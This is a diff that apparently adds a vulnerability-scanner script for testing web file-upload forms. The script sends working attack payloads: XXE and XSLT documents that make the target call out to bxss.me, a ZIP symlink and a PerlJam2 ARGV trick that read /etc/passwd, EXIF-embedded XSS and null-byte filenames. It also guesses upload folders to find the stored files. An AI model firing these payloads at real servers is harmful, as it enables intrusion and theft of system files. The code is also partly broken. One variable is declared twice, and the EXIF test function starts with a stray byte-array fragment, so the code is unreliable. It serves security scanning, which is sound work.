@@ -1,0 +1,866 @@
+#include constants.inc;
+#include helpers.inc;
+#include reporting_helpers.inc;
+#include os_detection.inc;
+#include debug_helpers.inc;
+#include string_helpers.inc;
+var TargetUrl = new TURL(scanURL.url);
+var scheme = getCurrentScheme();
+var baseDomain = getBaseDomain(TargetUrl);
+var detectURLstr = 'acunetix-file-upload-test';
+TargetUrl.path = scheme.path;
+TargetUrl.getVar = '';
+{ 
+	// class for testing for file uploads
+	function classFileUpload(scheme, inputIndex){
+		this.scheme = scheme;
+		this.lastJob = null;
+		this.foundOneUploadURL = false;	
+	}	
+	classFileUpload.prototype.alert = function(param, filename, contenttype, uri, sourceFile, sourceLine, additionalInfo, acuSensor)
+	{	
+		var ri 		= new TReportItem();
+		var isXSS 	= (filename.indexOf('.htm') != -1);
+        var isXSS 	= (filename.indexOf('.svg') != -1);
+		var isCDDH  = (filename.startsWith('CDDH'));
+		var isApplet  = (filename.startsWith('Applet'));
+		
+		if (isXSS) ri.LoadFromFile("File_Upload_XSS.xml");
+		else 
+		if (isCDDH) ri.LoadFromFile("Cross_Domain_Data_Hijacking.xml");
+		else
+		if (isApplet) ri.LoadFromFile("Applet_File_Upload.xml");
+		else
+		ri.LoadFromFile("File_Upload.xml");
+		
+		if (acuSensor) ri.name = ri.name + " (verified)";
+		
+		ri.affects = this.scheme.path;
+		ri.alertPath = "Scripts/File Upload";
+		ri.parameter = param;
+		
+		ri.setHttpInfo(this.lastJob);
+		
+		if (sourceFile)	ri.sensorSourceFile = sourceFile;
+		if (sourceLine) ri.sensorSourceLine = sourceLine;
+		if (additionalInfo) ri.sensorAdditional = additionalInfo;
+		
+		ri.details = "Successfully uploaded file [bold][dark]" + filename + "[/dark][/bold] with content type [bold][dark]" + contenttype + "[/dark][/bold].";
+		ri.Details =  ri.Details + "[break]The file is available at: [bold][dark]" + uri + "[/dark][/bold].";
+		
+		//trace(ri.Details);
+		AddReportItem(ri);	
+	}
+	
+	classFileUpload.prototype.alertXXE = function(param, filename, contenttype, testValue, subdomain, reqData)
+	{	
+		var ri = new TReportItem();
+		ri.LoadFromFile("XML_External_Entity_Injection_And_XML_Injection2.xml");
+		ri.affects = this.scheme.path;
+		ri.alertPath = "Scripts/XML_External_Entity_Injection_And_XML_Injection2";
+		
+		ri.parameter = param;
+		ri.parameterValue = testValue;
+		
+		ri.setHttpInfo(this.lastJob);		
+		
+		ri.details = "Successfully uploaded file [bold][dark]" + filename + "[/dark][/bold] with content type [bold][dark]" + contenttype + "[/dark][/bold].";		
+		ri.details = ri.details + "[break]File contents: [pre]" + testValue + "[/pre][break]";
+		
+		if (subdomain) {
+			ri.Details =  ri.Details + "[break]After the file upload, an HTTP request was initiated for the domain [bold]" + subdomain + ".bxss.me [/bold] which indicates that this script is vulnerable to XXE injection.";
+			if (reqData) {
+				ri.Details =  ri.Details + "[break][break]HTTP request details: [break][pre]" + reqData + "[/pre]";	
+			}
+		}
+		
+		//trace(ri.Details);
+		AddReportItem(ri);	
+	}
+    classFileUpload.prototype.alertXSLT = function(param, filename, contenttype, testValue, subdomain, reqData)
+    {
+        var ri = new TReportItem();
+        ri.LoadFromFile("XSLT_injection.xml");
+        ri.affects = this.scheme.path;
+        ri.alertPath = "Scripts/XSLT_injection.xml";
+        ri.parameter = param;
+        ri.parameterValue = testValue;
+        ri.setHttpInfo(this.lastJob);
+        ri.details = "Successfully uploaded file [bold][dark]" + filename + "[/dark][/bold] with content type [bold][dark]" + contenttype + "[/dark][/bold].";
+        ri.details = ri.details + "[break]File contents: [pre]" + testValue + "[/pre][break]";
+        if (subdomain) {
+            ri.Details =  ri.Details + "[break]After the file upload, an HTTP request was initiated for the domain [bold]" + subdomain + ".bxss.me [/bold] which indicates that this script is vulnerable to XSLT injection.";
+            if (reqData) {
+                ri.Details =  ri.Details + "[break][break]HTTP request details: [break][pre]" + reqData + "[/pre]";
+            }
+        }
+        //trace(ri.Details);
+        AddReportItem(ri);
+    }
+	
+	classFileUpload.prototype.alertZipSymlink = function(param, filename, contenttype, match)
+	{	
+		var ri = new TReportItem();
+		ri.LoadFromFile("File_Upload_ZIP_symlink.xml");
+		ri.affects = this.scheme.path;
+		ri.alertPath = "Scripts/File_Upload_ZIP_symlink";
+		
+		ri.parameter = param;
+		//ri.parameterValue = testValue;
+		
+		ri.setHttpInfo(this.lastJob);		
+		
+		ri.details = "Successfully uploaded file [bold][dark]" + filename + "[/dark][/bold] with content type [bold][dark]" + contenttype + "[/dark][/bold].";
+		ri.Details =  ri.Details + "[break]The file contains a symlink to /etc/passwd. It looks like the web application processed the ZIP archive and returned the contents of /etc/passwd: [break][pre]" + match.trunc(1024) + "[/pre]";
+		
+		//trace(ri.Details);
+		AddReportItem(ri);	
+	}
+    classFileUpload.prototype.alertPerljam2 = function(param, match)
+    {
+        var ri = new TReportItem();
+        ri.LoadFromFile("Directory_Traversal.xml");
+        ri.affects = this.scheme.path;
+        ri.alertPath = "Scripts/File_Upload_Directory_Traversal";
+        ri.parameter = param;
+        ri.setHttpInfo(this.lastJob);
+        ri.details = "The file parameter named [bold][dark]" + param + "[/dark][/bold] was polluted by creating another parameter with the same name and the value ARGV. This allows an attacker to read arbitrary files from the server by manipulating the script arguments. [break]";
+        ri.Details =  ri.Details + "Pattern found: [break][pre]" + match.trunc(1024) + "[/pre]";
+        //trace(ri.Details);
+        AddReportItem(ri);
+    }
+	
+	classFileUpload.prototype.alertEXIFXSS = function(param, filename, contenttype)
+	{	
+		var ri = new TReportItem();
+		
+		ri.LoadFromFile("File_Upload_XSS.xml");
+		
+		ri.name = "File upload XSS via EXIF tags";
+		ri.affects = this.scheme.path;
+		ri.alertPath = "Scripts/File_Upload_XSS_EXIF";
+		
+		ri.parameter = param;
+		//ri.parameterValue = testValue;
+		
+		ri.setHttpInfo(this.lastJob);		
+		
+		ri.details = "Successfully uploaded file [bold][dark]" + filename + "[/dark][/bold] with content type [bold][dark]" + contenttype + "[/dark][/bold].";
+		ri.Details =  ri.Details + "[break]The file contains EXIF entries containing XSS payloads. It looks like the web application processed the image and displayed their values without proper sanitization.";
+		
+		//trace(ri.Details);
+		AddReportItem(ri);	
+	}	
+	classFileUpload.prototype.TestUploadedFileOnUrl = function(url, searchStr, expectedContentType)	
+	{	
+		//trace('test uploaded file on path ' + url.path);	
+		//4d02070effdd7e319ca561bc66617a8a
+		this.lastJob = new THTTPJob();
+		this.lastJob.url = url;
+		this.lastJob.execute();
+		if(this.lastJob.wasError){
+			//trace(job.errorMessage);
+		}
+		else 
+		{				
+			//trace(this.lastJob.response.body);
+			if(this.lastJob.response.body.indexOf(searchStr)!=-1)
+            {
+                if (!expectedContentType) return true;
+                else {
+                 
+                    // inspect content-type
+                    var contentType = this.lastJob.response.headerValue('content-type');
+                    return (contentType.indexOf(expectedContentType) != -1);
+                }
+            }    
+		}		
+		return false;
+	}
+	
+	classFileUpload.prototype.prepareUploadURLs = function()
+	{		
+		var fileInputList = new TList();
+		// make a list with all file inputs
+		for(var i=0; i<this.scheme.inputCount; i++){
+			if (this.scheme.getInputFlags(i) & INPUT_FLAG_IS_FILE) fileInputList.add(i);
+		}	
+		if (fileInputList.count == 0) return true; 
+		// select variations that don't depend on the file input list
+		var variations = this.scheme.selectVariationsForInputList(fileInputList);
+		
+		// prepare list of upload URLs		
+		this.uploadURLs = new Array(variations.count);
+		
+		//trace('number of variations:' + variations.count);
+		
+		// init upload URLs
+		for(var i=0; i<variations.count; i++)
+		{
+			this.uploadURLs[i] = "{TO_BE_DETECTED}";
+		}	
+	}
+	classFileUpload.prototype.TestFileUpload = function(filename, contenttype, data, lookFor, appendPHPFilename, expectedContentType)
+	{	
+		//trace(">> TestFileUpload " + filename);
+        //trace(">> TestFileUpload ect=" + expectedContentType);        
+		var fileInputList = new TList();
+		var varIndex = 0;		
+		// make a list with all file inputs
+		for(var i=0; i<this.scheme.inputCount; i++){
+			if (this.scheme.getInputFlags(i) & INPUT_FLAG_IS_FILE) fileInputList.add(i);
+		}	
+		if (fileInputList.count == 0) return true; 
+		// select variations that don't depend on the file input list
+		var variations = this.scheme.selectVariationsForInputList(fileInputList);
+		// itterate through all selected variations
+		for(var i=0; i<variations.count; i++){
+			// load selected variation
+			this.scheme.loadVariation(variations.item(i));
+			// save variation index
+			varIndex = i;
+			//trace("varIndex=" + varIndex);
+			
+			// set the test on all matching inputs
+			for(var j=0; j<fileInputList.count; j++){
+				this.scheme.setInputFileName(fileInputList.item(j), filename);
+				this.scheme.setInputContentType(fileInputList.item(j), contenttype);		
+				this.scheme.setInputValue(fileInputList.item(j), data);
+			}
+			// create http job
+			this.lastJob = new THTTPJob();
+			this.lastJob.url = TargetUrl;
+			
+			this.scheme.populateRequest(this.lastJob);
+			if (this.scheme.targetHasAcuSensor) this.lastJob.addAspectHeaders();
+			
+			this.lastJob.execute();
+			
+			// for CVE-2015-2348, remove the part after \x00 from filename
+			if (filename.indexOf("\x00.jpg") != -1) {
+				filename=filename.replace("\x00.jpg", "");
+			}			
+			
+			if(this.lastJob.wasError){
+				//trace(this.lastJob.errorMessage);
+			}
+			else 
+			{	
+				//trace(this.uploadURLs[varIndex]);
+				
+				if (this.uploadURLs[varIndex] == '{NOT_FOUND}')
+				{
+					// don't do anything
+				}
+				
+				else
+									
+				// we didn't detected yet the uploadURL for this variation
+				if (this.uploadURLs[varIndex] == '{TO_BE_DETECTED}' || this.uploadURLs[varIndex] == '{BRUTEFORCE}')
+				{	
+					// if AcuSensor is enabled
+					if (this.lastJob.hasAspectData) 
+					{
+						//trace("aop is enabled!");
+						// get aspect data information
+						var ad = this.lastJob.getAspectData(); 					
+						var adItems = ad.getItemsWithKey("File_Upload");					
+						if (adItems && adItems.count) 
+						for (var i=0; i<adItems.count; i++)
+						{		
+							var aditem = adItems.item(i);					
+								
+								// have file upload data?
+								if (aditem) {
+									var stringList = aditem.getDataList();
+									for (var k=0; k<stringList.count; k++) 
+									{
+										var canonUrl = TargetUrl.canonicalize(stringList.item(k));
+										//trace(canonUrl.url);
+										var fullUrl  = canonUrl.url;
+										if (fullUrl != '') 
+										{
+											var leftPos = fullUrl.lastIndexOf("/");
+											var url = fullUrl.slice(0, leftPos+1);
+											
+											if (this.TestUploadedFileOnUrl(canonUrl, lookFor, expectedContentType)) 
+											{										
+												if (lookFor != detectURLstr)									
+													this.alert(this.scheme.getInputName(fileInputList.item(0)), filename, contenttype, canonUrl.path, aditem.FileName, aditem.lineNumber, aditem.additional, 1);
+																								
+												// save upload dir
+												if (url != "") 
+												{
+													this.foundOneUploadURL = true;													
+													//trace(url);
+													
+													if (canonUrl.url.indexOf(filename) == -1) this.uploadURLs[varIndex] = '{BRUTEFORCE}';
+													else this.uploadURLs[varIndex] = url;
+												}
+												
+												return true;
+												// create report item
+											}
+										}
+									}
+								} 
+								// next variation
+								continue;
+						}
+					}
+						
+					// if AcuSensor is not enabled 
+					var pd = getParserData(this.lastJob.response.body, this.lastJob.response.headerValue('content-type'));
+					if (pd) 
+					{
+						var links = pd.getLinks();
+						var foundFullFileName = false;
+						
+						if (links) 
+						{
+							var baseUrl = this.lastJob.url;
+							
+							for (var l=0; l<links.count; l++)
+							{
+								if (links.item(l).url.search(filename) != -1) 
+								{							
+									var canonUrl = baseUrl.canonicalize(links.item(l).url);
+									
+									if (canonUrl.isHTTP() && (baseDomain == getBaseDomain(canonUrl))) 
+										{
+											if (this.TestUploadedFileOnUrl(canonUrl, lookFor, expectedContentType)) 
+												{
+													var fullUrl  = canonUrl.url;
+													var leftPos = fullUrl.lastIndexOf("/");
+													var url = fullUrl.slice(0, leftPos+1);
+																										
+													//trace(url);
+													this.uploadURLs[varIndex] = url;
+													
+													this.foundOneUploadURL = true;
+													// create report item
+													if (lookFor != detectURLstr)
+														this.alert(this.scheme.getInputName(fileInputList.item(0)), filename, contenttype, canonUrl.path);
+													
+													return true;
+												}
+										}
+								}
+							}					
+						}
+							
+						if (foundFullFileName) continue;	
+					}
+					
+					
+					// extract filename extension
+					fileExt = getFileExt(filename);
+					//trace("fileExt = " +  fileExt);
+					
+					if (fileExt && links) 
+					{
+						// prepare a list of links found on page
+						var newLinks = new TStringList();
+						for (var l=0; l<links.count; l++)
+						{
+							// check file extension
+							if (links.item(l).url.lastIndexOf("." + fileExt) == (links.item(l).url.length - fileExt.length - 1)) 
+							{
+								newLinks.Add(links.item(l).url);
+							}
+						}
+						// have links to test?
+						if (newLinks.count) 
+						{					
+							// eliminate existing links
+							eliminateExistingLinks(this.lastJob.url, newLinks);
+							
+							linksCount = newLinks.count;
+							if (linksCount > 5) linksCount = 5; // only test maximum 5 new links
+							
+							var baseUrl = this.lastJob.url;
+							//trace(baseUrl.url);
+							
+							// test new links
+							for (var l=0; l< linksCount; l++) 
+							{
+								var canonUrl = null;
+							
+								// don't canonicalize absolute URLs
+								if (newLinks.item(l).indexOf("://") == -1)
+									 canonUrl = baseUrl.canonicalize(newLinks.item(l));
+								else canonUrl = new TURL(newLinks.item(l));
+									
+								if (canonUrl.isHTTP() && (baseDomain == getBaseDomain(canonUrl))) 
+									{									
+										//trace("new URL " + canonUrl.path);
+										if (this.TestUploadedFileOnUrl(canonUrl, lookFor, expectedContentType)) 
+										{			
+											//trace(url);
+											this.foundOneUploadURL = true;													
+											this.uploadURLs[varIndex] = '{BRUTEFORCE}';											
+											// create report item											
+											if (lookFor != detectURLstr)
+												this.alert(this.scheme.getInputName(fileInputList.item(0)), filename, contenttype, canonUrl.path);
+											return true;
+										}							
+									}
+							}				
+						}
+					}
+					
+					// full	filename not found in response. try to guess the path for the uploaded filename.
+					var possibleFolders = new TStringList();
+					possibleFolders.add("_uploads/");
+					possibleFolders.add("_upload/");
+					possibleFolders.add("uploads/");
+					possibleFolders.add("Uploads/");
+					possibleFolders.add("UPLOADS/");
+					possibleFolders.add("upload/");
+					possibleFolders.add("Upload/");
+					possibleFolders.add("UPLOAD/");
+					possibleFolders.add("images/");
+					possibleFolders.add("Images/");
+					possibleFolders.add("IMAGES/");
+					possibleFolders.add("img/");
+					possibleFolders.add("Img/");
+					possibleFolders.add("IMG/");
+					possibleFolders.add("pictures/");	
+					possibleFolders.add("Pictures/");	
+					possibleFolders.add("data/");	
+					possibleFolders.add("Data/");	
+					possibleFolders.add("files/");	
+					possibleFolders.add("Files/");	
+					possibleFolders.add("file/");	
+					possibleFolders.add("File/");	
+					possibleFolders.add("user/");	
+					possibleFolders.add("User/");	
+					possibleFolders.add("fileupload/");
+					possibleFolders.add("FileUpload/");
+					possibleFolders.add("file_upload/");	
+					possibleFolders.add("File_Upload/");	
+					possibleFolders.add("download/");	
+					possibleFolders.add("downloads/");	
+					possibleFolders.add("up/");	
+					possibleFolders.add("Up/");	
+					possibleFolders.add("UP/");	
+					possibleFolders.add("upld/");	
+					possibleFolders.add("down/");	
+					possibleFolders.add("templates/");
+					possibleFolders.add("temporary/");				
+					possibleFolders.add("temp/");
+					possibleFolders.add("Temp/");
+					possibleFolders.add("tmp/");
+					
+					for (var l=0;l<possibleFolders.count; l++){
+						var canonUrl = TargetUrl.canonicalize(possibleFolders.item(l) + filename);
+						if (this.TestUploadedFileOnUrl(canonUrl, lookFor, expectedContentType)) 
+						{
+							this.foundOneUploadURL = true;
+							
+							var fullUrl  = canonUrl.url;
+							var leftPos = fullUrl.lastIndexOf("/");
+							var url = fullUrl.slice(0, leftPos+1);
+																				
+							//trace(url);
+							this.uploadURLs[varIndex] = url;							
+							// create report item
+							if (lookFor != detectURLstr)
+								this.alert(this.scheme.getInputName(fileInputList.item(0)), filename, contenttype, canonUrl.path);
+							
+							return true;
+						}
+					}
+					
+					// we didn't managed to find an upload URL for this variation
+					if (this.uploadURLs[varIndex] == '{TO_BE_DETECTED}')
+						this.uploadURLs[varIndex] = '{NOT_FOUND}';					
+				}	
+				
+				// we have an upload URL
+				else 
+				{
+					// we have an upload URL
+					if (this.uploadURLs[varIndex] != '') 
+					{
+						// test on this upload URL
+                        var canonUrl = null;
+                        
+                        if (appendPHPFilename == 1) 
+						canonUrl = new TURL(this.uploadURLs[varIndex] + filename + '/acunetix.php');
+                        else
+                        canonUrl = new TURL(this.uploadURLs[varIndex] + filename);
+                                                    
+						if (this.TestUploadedFileOnUrl(canonUrl, lookFor, expectedContentType)) 
+						{
+							this.foundOneUploadURL = true;
+							
+							// create report item
+							if (lookFor != detectURLstr)
+								this.alert(this.scheme.getInputName(fileInputList.item(0)), filename, contenttype, canonUrl.path);
+							
+							return true;
+						}
+					}
+				}				
+			}	
+		}
+		
+		return false;
+	}
+	classFileUpload.prototype.TestXXEFileUpload = function(filename, contenttype)
+	{	
+		var rndToken = 'hit' + randStr(10);
+		var payload = '<?xml version="1.0" encoding="utf-8"?>' + "\r\n";
+		payload = payload + '<!DOCTYPE acunetix [' + "\r\n";
+		payload = payload + '  <!ENTITY acunetixent SYSTEM "http://' + rndToken + '.bxss.me/">' + "\r\n";
+		payload = payload + ']>' + "\r\n";
+		payload = payload + '<xxx>&acunetixent;</xxx>' + "\r\n";		
+		
+		//trace(">> TestXXEFileUpload " + filename);
+        //trace(">> TestXXEFileUpload ct=" + contenttype);        
+		var fileInputList = new TList();
+		var varIndex = 0;		
+		// make a list with all file inputs
+		for(var i=0; i<this.scheme.inputCount; i++){
+			if (this.scheme.getInputFlags(i) & INPUT_FLAG_IS_FILE) fileInputList.add(i);
+		}	
+		if (fileInputList.count == 0) return true; 
+		// select variations that don't depend on the file input list
+		var variations = this.scheme.selectVariationsForInputList(fileInputList);
+		// itterate through all selected variations
+		for(var i=0; i<variations.count; i++){
+			// load selected variation
+			this.scheme.loadVariation(variations.item(i));
+			// save variation index
+			varIndex = i;
+			//trace("varIndex=" + varIndex);
+			
+			// set the test on all matching inputs
+			for(var j=0; j<fileInputList.count; j++){
+				this.scheme.setInputFileName(fileInputList.item(j), filename);
+				this.scheme.setInputContentType(fileInputList.item(j), contenttype);		
+				this.scheme.setInputValue(fileInputList.item(j), payload);
+			}
+			// create http job
+			this.lastJob = new THTTPJob();
+			this.lastJob.url = TargetUrl;
+			
+			this.scheme.populateRequest(this.lastJob);
+			
+			this.lastJob.execute();
+			
+			// confirm XXE
+			if(!this.lastJob.wasError){					
+				var http 	= new THTTPJob();
+				http.url 	= new TURL("http://bxss.s3.amazonaws.com/hits/" + rndToken);
+				http.verb 	= "GET";
+				http.execute();
+				
+				//traceObject(http);
+				
+				if (!http.wasError && http.response.body.startsWith("IP address:")){
+					// report issue					
+					this.alertXXE(this.scheme.getInputName(fileInputList.item(0)), filename, contenttype, payload, rndToken, http.response.body);
+					return true;
+				}									
+			}						
+		}
+		
+		return false;
+	}
+    classFileUpload.prototype.TestPerlJam2 = function() {
+        var fileInputName = "";
+        // make a list with all file inputs
+        for(var i=0; i<this.scheme.inputCount; i++){
+            if (this.scheme.getInputFlags(i) & INPUT_FLAG_IS_FILE) {
+                fileInputName = this.scheme.getInputName(i);
+                break;
+            }
+        }
+        if (fileInputName) {
+            var url = this.scheme.path + "?/etc/passwd";
+            var body = '-----------------------------23780209327207' + CRLF();
+            body = body + 'Content-Disposition: form-data; name="' + fileInputName + '"' + CRLF();
+            body = body + CRLF();
+            body = body + 'ARGV' + CRLF();
+            body = body + '-----------------------------23780209327207' + CRLF();
+            body = body + 'Content-Disposition: form-data; name="' + fileInputName + '"; filename="1.txt"' + CRLF();
+            body = body + 'Content-Type: text/plain' + CRLF();
+            body = body + CRLF();
+            body = body + 'test' + CRLF();
+            body = body + '-----------------------------23780209327207--' + CRLF();
+            this.lastJob = new THTTPJob();
+            this.lastJob.url = scanUrl;
+            this.lastJob.verb = 'POST';
+            this.lastJob.uri = url;
+            this.lastJob.request.addHeader('Content-type', 'multipart/form-data; boundary=---------------------------23780209327207', true);
+            this.lastJob.request.body = body;
+            this.lastJob.execute();
+            // look for /etc/passwd
+            if (!this.lastJob.wasError) {
+                var regex = /((root|bin|daemon|sys|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\d\w-\s,]+:\d+:\d+:[\w-_\s,]*:[\w-_\s,\/]*:[\w-_,\/]*[\r\n])/;
+                var m = regex.exec(this.lastJob.response.body);
+                if (m) {
+                    this.alertPerljam2(fileInputName, m[0]);
+                    return true;
+                }
+            }
+        }
+    }
+    classFileUpload.prototype.TestXSLTFileUpload = function(filename, contenttype)
+    {
+        var rndToken = 'hit' + randStr(10);
+        var payload = '<?xml version="1.0" encoding="UTF-8"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:output method="html"/><xsl:template match="/"> <xsl:value-of select="document(\'http://' + rndToken + '.bxss.me/\')"/></xsl:template></xsl:stylesheet>';
+        //trace(">> TestXSLTFileUpload " + filename);
+        //trace(">> TestXSLTFileUpload ct=" + contenttype);
+        var fileInputList = new TList();
+        var varIndex = 0;
+        // make a list with all file inputs
+        for(var i=0; i<this.scheme.inputCount; i++){
+            if (this.scheme.getInputFlags(i) & INPUT_FLAG_IS_FILE) fileInputList.add(i);
+        }
+        if (fileInputList.count == 0) return true;
+        // select variations that don't depend on the file input list
+        var variations = this.scheme.selectVariationsForInputList(fileInputList);
+        // itterate through all selected variations
+        for(var i=0; i<variations.count; i++){
+            // load selected variation
+            this.scheme.loadVariation(variations.item(i));
+            // save variation index
+            varIndex = i;
+            //trace("varIndex=" + varIndex);
+            // set the test on all matching inputs
+            for(var j=0; j<fileInputList.count; j++){
+                this.scheme.setInputFileName(fileInputList.item(j), filename);
+                this.scheme.setInputContentType(fileInputList.item(j), contenttype);
+                this.scheme.setInputValue(fileInputList.item(j), payload);
+            }
+            // create http job
+            this.lastJob = new THTTPJob();
+            this.lastJob.url = TargetUrl;
+            this.scheme.populateRequest(this.lastJob);
+            this.lastJob.execute();
+            // confirm XSLT
+            if(!this.lastJob.wasError || (this.lastJob.wasError && this.lastJob.errorCode == 0xF0003)){
+                var http 	= new THTTPJob();
+                http.url 	= new TURL("http://bxss.s3.amazonaws.com/hits/" + rndToken);
+                http.verb 	= "GET";
+                http.execute();
+                //traceObject(http);
+                if (!http.wasError && http.response.body.startsWith("IP address:")){
+                    // report issue
+                    this.alertXSLT(this.scheme.getInputName(fileInputList.item(0)), filename, contenttype, payload, rndToken, http.response.body);
+                    return true;
+                }
+            }
+        }
+        return false;
+    }
+    classFileUpload.prototype.TestZipSymlinkUpload = function(filename, contenttype)
+	{	
+		var payload = strFromRawData(0x50, 0x4B, 0x03, 0x04, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x38, 0x4D, 0x46, 0x0A, 0xB9, 0x1F, 0x29, 0x0B, 0x00, 0x00, 0x00, 0x0B, 0x00, 0x00, 0x00, 0x04, 0x00, 0x1C, 0x00, 0x6C, 0x69, 0x6E, 0x6B, 0x55, 0x54, 0x09, 0x00, 0x03, 0x7B, 0x11, 0xDE, 0x54, 0x7C, 0x11, 0xDE, 0x54, 0x75, 0x78, 0x0B, 0x00, 0x01, 0x04, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x2F, 0x65, 0x74, 0x63, 0x2F, 0x70, 0x61, 0x73, 0x73, 0x77, 0x64, 0x50, 0x4B, 0x01, 0x02, 0x1E, 0x03, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x38, 0x4D, 0x46, 0x0A, 0xB9, 0x1F, 0x29, 0x0B, 0x00, 0x00, 0x00, 0x0B, 0x00, 0x00, 0x00, 0x04, 0x00, 0x18, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xA1, 0x00, 0x00, 0x00, 0x00, 0x6C, 0x69, 0x6E, 0x6B, 0x55, 0x54, 0x05, 0x00, 0x03, 0x7B, 0x11, 0xDE, 0x54, 0x75, 0x78, 0x0B, 0x00, 0x01, 0x04, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x50, 0x4B, 0x05, 0x06, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x4A, 0x00, 0x00, 0x00, 0x49, 0x00, 0x00, 0x00, 0x00, 0x00);
+		
+		//trace(">> TestZipSymlinkUpload " + filename);
+        //trace(">> TestZipSymlinkUpload ct=" + contenttype);
+		var fileInputList = new TList();
+		var varIndex = 0;		
+		// make a list with all file inputs
+		for(var i=0; i<this.scheme.inputCount; i++){
+			if (this.scheme.getInputFlags(i) & INPUT_FLAG_IS_FILE) fileInputList.add(i);
+		}	
+		if (fileInputList.count == 0) return true; 
+		// select variations that don't depend on the file input list
+		var variations = this.scheme.selectVariationsForInputList(fileInputList);
+		// itterate through all selected variations
+		for(var i=0; i<variations.count; i++){
+			// load selected variation
+			this.scheme.loadVariation(variations.item(i));
+			// save variation index
+			varIndex = i;
+			//trace("varIndex=" + varIndex);
+			
+			// set the test on all matching inputs
+			for(var j=0; j<fileInputList.count; j++){
+				this.scheme.setInputFileName(fileInputList.item(j), filename);
+				this.scheme.setInputContentType(fileInputList.item(j), contenttype);		
+				this.scheme.setInputValue(fileInputList.item(j), payload);
+			}
+			// create http job
+			this.lastJob = new THTTPJob();
+			this.lastJob.url = TargetUrl;
+			
+			this.scheme.populateRequest(this.lastJob);
+			
+			this.lastJob.execute();
+			
+			// look for /etc/passwd
+			if(!this.lastJob.wasError){					
+				var regex = /((root|bin|daemon|sys|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\d\w-\s,]+:\d+:\d+:[\w-_\s,]*:[\w-_\s,\/]*:[\w-_,\/]*[\r\n])/;
+				var m = regex.exec(this.lastJob.response.body);
+				if (m) {
+						this.alertZipSymlink(this.scheme.getInputName(fileInputList.item(0)), filename, contenttype, m[0]);
+						return true;
+				}
+				
+				var b64decoded = b642plain(this.lastJob.response.body);
+				var m = regex.exec(b64decoded);
+				if (m) {
+						this.alertZipSymlink(this.scheme.getInputName(fileInputList.item(0)), filename, contenttype, m[0]);
+						return true;
+				}				
+			}
+		}
+		
+		return false;
+	}
+	classFileUpload.prototype.TestImageUploadExifXSS = function(filename, contenttype)
+	{	
+66, 0x74, 0x50, 0x68, 0x6F, 0x74, 0x6F, 0x3A,  0x4C, 0x65, 0x6E, 0x73, 0x4D, 0x6F, 0x64, 0x65, 0x6C, 0x3E, 0x26, 0x6C, 0x74, 0x3B, 0x73,  0x76, 0x67, 0x20, 0x6F, 0x6E, 0x6C, 0x6F, 0x61, 0x64, 0x3D, 0x61, 0x6C, 0x65, 0x72, 0x74,  0x28, 0x37, 0x33, 0x34, 0x36, 0x37, 0x36, 0x33, 0x29, 0x26, 0x67, 0x74, 0x3B, 0x3C, 0x2F,  0x4D, 0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74, 0x50, 0x68, 0x6F, 0x74, 0x6F, 0x3A,  0x4C, 0x65, 0x6E, 0x73, 0x4D, 0x6F, 0x64, 0x65, 0x6C, 0x3E, 0x3C, 0x4D, 0x69, 0x63, 0x72,  0x6F, 0x73, 0x6F, 0x66, 0x74, 0x50, 0x68, 0x6F, 0x74, 0x6F, 0x3A, 0x4C, 0x61, 0x73, 0x74,  0x4B, 0x65, 0x79, 0x77, 0x6F, 0x72, 0x64, 0x58, 0x4D, 0x50, 0x3E, 0x3C, 0x72, 0x64, 0x66,  0x3A, 0x42, 0x61, 0x67, 0x20, 0x78, 0x6D, 0x6C, 0x6E, 0x73, 0x3A, 0x72, 0x64, 0x66, 0x3D,  0x22, 0x68, 0x74, 0x74, 0x70, 0x3A, 0x2F, 0x2F, 0x77, 0x77, 0x77, 0x2E, 0x77, 0x33, 0x2E,  0x6F, 0x72, 0x67, 0x2F, 0x31, 0x39, 0x39, 0x39, 0x2F, 0x30, 0x32, 0x2F, 0x32, 0x32, 0x2D,  0x72, 0x64, 0x66, 0x2D, 0x73, 0x79, 0x6E, 0x74, 0x61, 0x78, 0x2D, 0x6E, 0x73, 0x23, 0x22,  0x3E, 0x3C, 0x72, 0x64, 0x66, 0x3A, 0x6C, 0x69, 0x3E, 0x26, 0x6C, 0x74, 0x3B, 0x73, 0x76,  0x67, 0x20, 0x6F, 0x6E, 0x6C, 0x6F, 0x61, 0x64, 0x3D, 0x61, 0x6C, 0x65, 0x72, 0x74, 0x28,  0x37, 0x33, 0x34, 0x36, 0x37, 0x36, 0x33, 0x29, 0x26, 0x67, 0x74, 0x3B, 0x3C, 0x2F, 0x72,  0x64, 0x66, 0x3A, 0x6C, 0x69, 0x3E, 0x3C, 0x2F, 0x72, 0x64, 0x66, 0x3A, 0x42, 0x61, 0x67,  0x3E, 0x0D, 0x0A, 0x09, 0x09, 0x09, 0x3C, 0x2F, 0x4D, 0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F,  0x66, 0x74, 0x50, 0x68, 0x6F, 0x74, 0x6F, 0x3A, 0x4C, 0x61, 0x73, 0x74, 0x4B, 0x65, 0x79,  0x77, 0x6F, 0x72, 0x64, 0x58, 0x4D, 0x50, 0x3E, 0x3C, 0x2F, 0x72, 0x64, 0x66, 0x3A, 0x44,  0x65, 0x73, 0x63, 0x72, 0x69, 0x70, 0x74, 0x69, 0x6F, 0x6E, 0x3E, 0x3C, 0x72, 0x64, 0x66,  0x3A, 0x44, 0x65, 0x73, 0x63, 0x72, 0x69, 0x70, 0x74, 0x69, 0x6F, 0x6E, 0x20, 0x72, 0x64,  0x66, 0x3A, 0x61, 0x62, 0x6F, 0x75, 0x74, 0x3D, 0x22, 0x75, 0x75, 0x69, 0x64, 0x3A, 0x66,  0x61, 0x66, 0x35, 0x62, 0x64, 0x64, 0x35, 0x2D, 0x62, 0x61, 0x33, 